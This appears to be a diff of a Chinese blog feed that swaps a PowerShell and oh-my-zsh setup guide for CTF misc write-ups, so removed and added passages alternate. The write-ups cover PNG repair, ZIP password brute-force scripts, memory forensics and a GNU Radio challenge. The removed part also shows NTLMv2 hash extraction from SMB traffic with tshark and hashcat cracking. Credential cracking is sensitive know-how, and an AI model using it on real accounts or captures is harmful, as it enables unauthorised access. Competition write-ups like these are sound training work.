-<h4 id="extract">extract</h4>
-<p><code>oh-my-zsh</code> 内置了 <code>extract</code> 插件。<code>extract</code> 用于解压任何压缩文件，不必根据压缩文件的后缀名来记忆压缩软件。使用 <code>x</code> 命令即可解压文件。</p>
-<h4 id="web-search">web-search</h4>
-<p>oh-my-zsh 内置了 <code>web-search</code> 插件。<code>web-search</code> 能让我们在命令行中使用搜索引擎进行搜索。使用<code>搜索引擎关键字+搜索内容</code> 即可自动打开浏览器进行搜索。</p>
-<h3 id="启动插件">启动插件</h3>
-<p>修改<code>~/.zshrc</code>中插件列表为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting z extract web-search)</span><br></pre></td></tr></table></figure>
-<p>部分插件需要参考插件介绍进行安装</p>
-<p>然后重启终端即可使用</p>
-<h3 id="ROOT用户启用">ROOT用户启用</h3>
-<p>重复上述步骤即可</p>
-<h2 id="Windows-PowerShell">Windows-PowerShell</h2>
-<p>使用oh-my-posh默认主题美化，效果如图</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104518993.png"
-                        alt="image-20241009104518993"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_14-35-03.png"
+                        alt="Clip_2024-07-23_14-35-03"
                  ></p>
-<h3 id="环境配置-2">环境配置</h3>
-<p>首先在Microsoft Store搜索下载oh-my-posh</p>
+<p>在010中把有问题的IDAT块复制，找一张png图片，取其文件头尾，将IDAT块复制出，作为一张新的图片，但因为宽高不知，用Puzzle Solver进行宽高爆破，得到宽高是500*500，获得flag   <code>a19131f86216&#125;</code></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104304519.png"
-                        alt="image-20241009104304519"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/500X500_2_3_8.png"
+                        alt="500X500_2_3_8"
                  ></p>
-<p>打开一个PowerShell，输入<code>$PORFILE</code>，查看配置文件所在位置</p>
+<p>StegSlove中可以看到Alpha通道有东西</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104438608.png"
-                        alt="image-20241009104438608"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-25-34.png"
+                        alt="Clip_2024-07-23_15-25-34"
                  ></p>
-<p>也可以用everything直接找，如果不存在则手动创建即可</p>
-<p>在配置文件中写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\\Users\\67300\\AppData\\Local\\Programs\\oh-my-posh\\bin\\oh-my-posh.exe init pwsh --config $env:POSH_THEMES_PATH\montys.omp.json | Invoke-Expression</span><br><span class="line"></span><br><span class="line">需要自己根据情况更改，注意文件地址表示是否正确</span><br></pre></td></tr></table></figure>
-<p>随后重启终端查看配置文件能否正常运行，如果顺利则可以正常使用</p>
-<h3 id="报错处理">报错处理</h3>
+<p>尝试后可以找到中间段flag  <code>d-5405-c5f5-</code></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104830606.png"
-                        alt="image-20241009104830606"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-26-38.png"
+                        alt="Clip_2024-07-23_15-26-38"
                  ></p>
-<p>以管理员身份打开一个新的终端，输入以下命令</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start-process</span> PowerShell <span class="literal">-verb</span> runas</span><br><span class="line"></span><br><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure>
-<p>然后重启终端即可。</p>
-<p>如果遇到无法正常显示，显示为乱码或方框，则需要修改终端默认字体</p>
-<p><a class="link"   href="https://www.nerdfonts.com/font-downloads" >Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher<i class="fas fa-external-link-alt"></i></a> 在这个网站上，ctrl + F 搜索<code>JetBrainsMono Nerd Font Mono</code>，然后下载并安装该字体</p>
+<h3 id="EZ-zip">EZ_zip</h3>
+<p><a class="link"   href="https://hello-ctf.com/HC_MISC/Archivefile/#zip" >压缩包文件结构<i class="fas fa-external-link-alt"></i></a></p>
+<p>直接解压会报错，010打开模板报错，发现解压文件长度不对，可以看到<code>320.zip</code>长度应该为7（文件长度要加后缀长度），修改为7，要将文件头和目录区长度都修改</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105545990.png"
-                        alt="image-20241009105545990"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-47-29.png"
+                        alt="Clip_2024-07-23_15-47-29"
                  ></p>
-<p>右键安装后在PowerShell中打开设置</p>
+<p>解压后提示CRC校验错误，参照着DirEntry改动record段，可以发现是解压方法被改成了store，跟压缩方法对不上，修改解压方式</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009105635329.png"
-                        alt="image-20241009105635329"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_15-58-20.png"
+                        alt="Clip_2024-07-23_15-58-20"
                  ></p>
-<p>找到PowerShell的外观设置，<strong>这里还能进行背景图，透明度等相关设置</strong></p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110113349.png"
-                        alt="image-20241009110113349"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-23.png"
+                        alt="Clip_2024-07-23_16-00-23"
                  ></p>
-<p>选择JetBrainsMono Nerd Font Mono字体并保存</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110129639.png"
-                        alt="image-20241009110129639"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-00-36.png"
+                        alt="Clip_2024-07-23_16-00-36"
                  ></p>
-<h3 id="修改主题">修改主题</h3>
-<p>找到oh-my-posh安装路径下的thems文件夹并打开，每一个json文件名都是一个主题，将需要的主题名复制填写到配置文件的对应位置即可。</p>
+<p>修改后可以正常进行解压得到<code>320.zip</code>，查看压缩文件注释可以得到密码的提示<code>just a byte</code>，密码为一个字节，可以使用python进行爆破。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>解压得到一个txt，提示加密方法为AES-ECB，并提示key可能在前面的过程中就出现了</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110243978.png"
-                        alt="image-20241009110243978"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-03-17.png"
+                        alt="Clip_2024-07-23_16-03-17"
                  ></p>
-<h3 id="安装扩展">安装扩展</h3>
-<h4 id="安装Git扩展">安装Git扩展</h4>
-<p>posh-git 是一款专为 Windows 系统的 PowerShell 设计的 Git 扩展模块。它的主要目标是在 PowerShell 中提供更为友好、直观的 Git 命令行界面，通过整合 Git 相关的信息到命令提示符中，并提供方便快捷的键绑定，使得日常 Git 操作更为高效、直观。</p>
-<p>安装</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> posh<span class="literal">-git</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>
-<p>安装完成后，重启 PowerShell 并输入以下命令启用 posh-git：<code>Import-Module posh-git</code></p>
-<p>不生效的话可以在前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>中追加以下内容</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> posh<span class="literal">-git</span> <span class="comment"># 引入 posh-git</span></span><br></pre></td></tr></table></figure>
-<h4 id="历史命令联想">历史命令联想</h4>
-<p><code>oh-my-zsh</code> 有一个很便利的功能就是输入部分命令后、按 <code>↑</code> 或 <code>↓</code> 就可以联想历史的完整命令，其实在 <code>oh-my-posh</code> 中也能实现。</p>
-<p>首先在 <code>PowerShell</code> 执行以下命令安装插件：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PowerShellGet <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Install-Module</span> PSReadLine <span class="literal">-AllowPrerelease</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-<p>然后修改前面的配置文件 <code>Microsoft.PowerShell_profile.ps1</code>，在末尾追加以下内容：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PSReadLine <span class="comment"># 历史命令联想</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置预测文本来源为历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span> </span><br><span class="line"><span class="comment"># 设置 Tab 为菜单补全和 Intellisense </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> <span class="string">&quot;Tab&quot;</span> <span class="literal">-Function</span> MenuComplete </span><br><span class="line"><span class="comment"># 每次回溯输入历史，光标定位于输入内容末尾 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-HistorySearchCursorMovesToEnd</span> </span><br><span class="line"><span class="comment"># 设置向上键为后向搜索历史记录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward </span><br><span class="line"><span class="comment"># 设置向下键为前向搜索历史纪录 </span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br></pre></td></tr></table></figure>
-<h4 id="卸载">卸载</h4>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Uninstall-Module</span> <span class="built_in">oh</span><span class="literal">-my-posh</span> <span class="literal">-AllVersions</span></span><br></pre></td></tr></table></figure>
-<h2 id="Windows-CMD">Windows-CMD</h2>
-<p>使用clink + oh-my-posh进行美化，效果如图</p>
+<p>联想到前面解压密码是字节形式，通过打印解压密码发现</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    zip_filename = <span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span></span><br><span class="line">    zf = pyzipper.AESZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>+<span class="number">1</span>):</span><br><span class="line">        password = j.to_bytes(length=<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        zf.setpassword(password)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zf.extractall()</span><br><span class="line">            key += password</span><br><span class="line">            zf.close()</span><br><span class="line">            os.remove(<span class="built_in">str</span>(i) + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(key[::-<span class="number">1</span>].<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+<p><code>c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11</code></p>
+<p>是循环的一个64位字符，将其当作key解密AES得到flag</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009110926127.png"
-                        alt="image-20241009110926127"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-07-23_16-04-42.png"
+                        alt="Clip_2024-07-23_16-04-42"
                  ></p>
-<p>首先，安装<a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fchrisant996%2Fclink%2Freleases&amp;source=article&amp;objectId=2442201" >clink<i class="fas fa-external-link-alt"></i></a>，下载exe安装包即可，然后进入 <code>clink</code> 安装目录，创建 <code>oh-my-posh.lua</code> 文件，添加如下内容：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
-<p>如果使用的是自定义主题，则添加如下内容</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load(io.popen(<span class="string">&#x27;oh-my-posh init cmd --config C:\\Users\\&#123;你的用户名&#125;\\AppData\\Local\\Programs\\oh-my-posh\\themes\\montys.omp.json&#x27;</span>):read(<span class="string">&quot;*a&quot;</span>))()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>2024 浙江省赛初赛 Misc方向 全WriteUp</title>
-    <url>//post/2024zjctfcs/</url>
-    <content><![CDATA[<h3 id="签到">签到</h3>
-<h4 id="第二题">第二题</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6L&lt;Ak3,*@VM*&gt;7U&amp;FZFNWc,Ib=t,X!+,BnSDfoaNhdiO*][5F];eV^]Lm&amp;?$&#x27;&lt;oeGH&amp;6tqcgK_JDp-3;8wh?Si,G$BarTFjE?b$eR/,Igij&lt;(&#123;u90M$5If589[&lt;4+jp%3_%R(526#1J|m5p&amp;H+%.#d0&lt;DmLK*#-\8w:xD2Y[3jO&#123;l8[)&lt;(F[=Bcixb&gt;Jp^%L2XvVTzW@9OTko/P74d1sFscEbMO7Vhp&amp;HM;+ww/v[KM1%2M*7O\&#125;rEZM.LM0&#x27;\iwK:])pg-nJef\Rt4</span><br></pre></td></tr></table></figure>
-<p>使用CyberChef：Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32</p>
+<h3 id="ServerMeM">ServerMeM</h3>
+<p>题面信息如下</p>
+<blockquote>
+<p>公司的服务器遭受了黑客的攻击，经过勘察黑客为维持权限留下了后门，我们获取到了服务器的内存文件，请你分析黑客留下的痕迹</p>
+</blockquote>
+<p>下载附件并解压得到：out.lime、System.map</p>
+<p>在WSL中用以下命令搜索一下得到Linux内核的版本号，因此很明显就是Linux内存取证了</p>
+<blockquote>
+<p>strings mem | grep -i ‘Linux version’ | uniq</p>
+</blockquote>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ssqd1.png"
-                        alt="1"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923181948954.png"
+                        alt="image-20240923181948954"
                  ></p>
-<p>可获得flag</p>
-<h3 id="Misc">Misc</h3>
-<h4 id="RealSignin">RealSignin</h4>
-<p>得到一张png图片，zsteg一下<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162038038.png"
-                        alt=""
-                 ></p>
-<p>文件末尾的是密文，LSB隐写了base表</p>
+<p>本题提供两种解法，第一种是常规的通过制作Linux的符号文件来进行取证，另一种就是直接分析内存中的可疑文件</p>
+<h4 id="解法一">解法一</h4>
+<p>Linux内核版本信息如下：</p>
+<blockquote>
+<p>Linux version 5.4.27 (root@localhost.localdomain) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC)) #1 SMP Sun May 26 03:37:06 EDT 2024</p>
+</blockquote>
+<h4 id="解法二">解法二</h4>
+<p>直接在strings的结果中搜索 ”.tar.gz” 后缀的文件，发现有一个S3rCr3t.tar.gz</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162238054.png"
-                        alt="image-20241102162238054"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182121568.png"
+                        alt="image-20240923182121568"
                  ></p>
-<h4 id="机密文档">机密文档</h4>
-<p>下载后发现文件是加密的，经尝试后发现是明文攻击<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-35-03.png"
-                        alt="PixPin_2024-11-02_14-35-03"
-                 ></p>
-<p>如图，使用<code>echo -n &quot;the_secret_you_never_ever_know_hahahaha&quot; &gt; mingwen.txt</code>命令可以将内容写入<code>mingwen.txt</code>，这段明文已经超过8字节，加上已知的<code>50 4B 03 04</code>进行明文攻击，可知偏移量为<code>30</code>，得到如图三段密钥，然后得到密钥后使用三段密钥修改文件密码为<code>111111</code>，然后解压得到一个docm文件，修改后缀为zip后解压，在media文件夹内找到一张图</p>
-<p>打开docm文件可以看到<code>宏已被禁用</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba  the_secret_you_never_ever_know_hahahaha.docm &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p>可以发现一个异或的逻辑</p>
+<p>知道了文件名后直接在010中搜索，得到了openssl AES加密后的密文（以Salted开头）</p>
+<p>还有openssl的具体版本：1.0.2k</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-42-40.png"
-                        alt="PixPin_2024-11-02_14-42-40"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
+                        alt="image-20240923182211807"
                  ></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">26</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">3</span>]</span><br><span class="line">key =  <span class="string">&quot;outguess&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = data[i] ^ <span class="built_in">ord</span>(key[(i % key_len)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>第47行为异或后的key，用它解media里的图片 outguess隐写即可</p>
-<p>要把后缀名改成jpg</p>
+<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-41-58.png"
-                        alt="PixPin_2024-11-02_14-41-58"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
+                        alt="11111111"
                  ></p>
-<p>解得flag</p>
+<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102164145781.png"
-                        alt="image-20241102164145781"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
+                        alt="image-20240923182320920"
                  ></p>
-<h4 id="eztraffic">eztraffic</h4>
-<p>打开查看协议分级，发现主要为SMB流量，尝试导出SMB对象，获得<code>final_out.zip</code></p>
+<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
+<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
+<blockquote>
+<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
+<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
+<p>cd openssl-1.0.2k.tar.gz</p>
+<p>./config --prefix=/usr/</p>
+<p>make</p>
+</blockquote>
+<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
+<blockquote>
+<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
+</blockquote>
+<h3 id="ez-wav">ez_wav</h3>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204050166.png"
-                        alt="image-20241106204050166"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
+                        alt="das240711"
                  ></p>
-<p>打开后看到注释</p>
+<p>打开key.grc</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204141917.png"
-                        alt="image-20241106204141917"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
+                        alt="das240712"
                  ></p>
-<p>猜测是SMB协议传输的NTLM密码+五位数字掩码攻击获得flag，使用tshark导出</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y <span class="string">&#x27;ntlmssp.messagetype == 0x00000003&#x27;</span> -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
+<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
+<blockquote>
+<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
+<p>下面的Vector Source提供的一个脉冲信号</p>
+</blockquote>
+<p>exp如下</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204254865.png"
-                        alt="image-20241106204254865"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
+                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
                  ></p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br><span class="line">#根据这个格式找到下面的格式然后hashcat爆破</span><br><span class="line">rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-<p>得到密码<code>haticehatice</code>，并进行掩码攻击</p>
+<p>010打开后得到密码 good_job</p>
+<p>打开flag.grc</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105125829668.png"
-                        alt="image-20241105125829668"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
+                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
                  ></p>
-<p>得到解压密码后获得100张图片，在每张图片的<code>Red 0</code>通道中找到一张隐写的二维码，扫描二维码得到该图片在拼图中的顺序，写脚本完成拼图</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">imgname</span>):</span><br><span class="line">    r = []</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    width,height = img.size</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            pixel = img.getpixel((x,y))</span><br><span class="line">            r.append(<span class="built_in">str</span>(pixel[<span class="number">0</span>] &amp; <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(pixel)</span></span><br><span class="line">    bin_data = <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> bin_data  </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2img</span>(<span class="params">bin_data</span>):</span><br><span class="line">    imgname = <span class="string">&quot;tmp.png&quot;</span></span><br><span class="line">    pixels = []</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bin_data:</span><br><span class="line">        <span class="keyword">if</span> item ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels.append((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            pixels.append((<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    img.putdata(pixels)</span><br><span class="line">    <span class="comment"># img.show()</span></span><br><span class="line">    img = img.resize((<span class="number">500</span>,<span class="number">500</span>)) </span><br><span class="line">    <span class="comment"># 这里调整一下图片的大小，便于后面pyzbar的识别</span></span><br><span class="line">    img.save(imgname)</span><br><span class="line">    <span class="keyword">return</span> imgname</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qrcode</span>(<span class="params">imgname</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    decode_data = decode(img)</span><br><span class="line">    <span class="comment"># print(decode_data)</span></span><br><span class="line">    res = decode_data[<span class="number">0</span>].data.decode()</span><br><span class="line">    